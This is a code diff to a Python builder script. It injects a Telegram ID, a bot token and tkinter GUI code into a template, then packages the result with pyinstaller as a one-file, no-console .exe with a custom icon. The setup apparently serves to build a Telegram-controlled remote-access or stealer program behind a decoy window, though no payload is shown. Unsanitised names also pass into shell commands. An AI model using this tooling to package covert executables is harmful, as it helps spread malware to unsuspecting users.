@@ -1,6 +1,13 @@
 from colorama import init, Fore, Style
-from os import system
+from subprocess import getoutput
+from modules import banner
+from time import sleep
 init()
+def printer(per="0"):
+    banner.clear()
+    banner.same_banner()
+    print(Fore.GREEN + f"Creating EXE file({per}%).")
+    sleep(1)
 def make_python(ID, TOKEN, NAME, CODE_ADDR, OFFLINE_CODE_ADDR):
     with open("builder/build.py", "r") as read: 
         text = read.readlines()
@@ -19,11 +26,18 @@ def make_python(ID, TOKEN, NAME, CODE_ADDR, OFFLINE_CODE_ADDR):
             for i in reader:
                 offline_tkinter_code += f"    {i}\n"
         text = "".join(text).replace("TELEGRAM_ID", ID).replace("BOT_TOKEN", f'"{TOKEN}"').replace("TK_CODE", tkinter_code).replace("OFFLINE_TKINTER_CODE", offline_tkinter_code)
-    system("mkdir output")
+    getoutput("mkdir output")
     with open(f"output/{NAME}.py", "w") as write:
         write.write(text)
     print(Fore.GREEN + "File is created in /output directory.")
 def make_exe(NAME, ICON): 
-    system("mkdir output/exe")
-    system(f"pyinstaller --name {NAME} --onefile -i {ICON} --noconsole --distpath output/exe output/{NAME}.py")
-    print(Fore.GREEN + f".exe application is created in /output/exe/{NAME}.exe")
+    printer("0")
+    getoutput("mkdir output/exe")
+    printer("15")
+    out = getoutput(f"pyinstaller --name {NAME} --onefile -i {ICON} --noconsole --distpath output/exe output/{NAME}.py")
+    printer("50")
+    with open("log/pyinstaller-out.txt", "w") as file:
+        file.write(out)
+        printer("80")
+    printer("100")
+    print(Fore.GREEN + f"\n\n.exe application is created in /output/exe/{NAME}.exe\n{Fore.YELLOW} If not check log/pyinstaller-out.txt")
